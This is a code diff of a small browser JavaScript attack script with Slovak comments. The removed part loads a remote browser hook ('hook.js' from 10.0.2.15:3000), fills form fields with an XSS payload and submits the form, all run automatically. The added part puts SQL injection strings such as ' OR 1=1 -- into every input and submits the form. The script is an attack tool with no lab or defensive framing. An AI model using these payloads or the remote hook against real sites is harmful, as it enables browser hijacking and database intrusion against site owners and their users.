@@ -1,28 +1,20 @@
-function injectHookJS() {
-    const url ='http://10.0.2.15:3000/hook.js';
-    const script = document.createElement('script');
-    script.src = url;
-    script.type = 'text/javascript';
-    document.body.appendChild(script);
-  }
-  
-function testXSS() {
-    const xssPayload = '<script>alert("XSS Test!")</script>';
-    
-    // Vyberieme len input a textarea polia
-    const formInputs = document.querySelectorAll('input[type="text"], input[type="password"], textarea');
-    
-    formInputs.forEach(input => {
-      input.value = xssPayload;
-    });
-  
-    // Automatické odoslanie formulára (ak existuje)
+// Funkcia na testovanie SQL Injection
+function testSQLInjection() {
+  const sqlPayloads = [
+    "' OR 1=1 --",
+    "' UNION SELECT NULL, NULL --",
+    "' OR 'a'='a"
+  ];
+
+  const formInputs = document.querySelectorAll('input, textarea');
+  formInputs.forEach(input => {
+    // Vložte SQL injection do vstupného poľa
+    input.value = sqlPayloads[0];  // Používa prvý payload z poľa
+
+    // Môžete pridať logiku na overenie reakcie po odoslaní formulára
     const form = document.querySelector('form');
     if (form) {
-      form.submit();
+      form.submit();  // Odoslať formulár
     }
+  });
 }
-(function() {
-    injectHookJS();
-    testXSS();
-})();
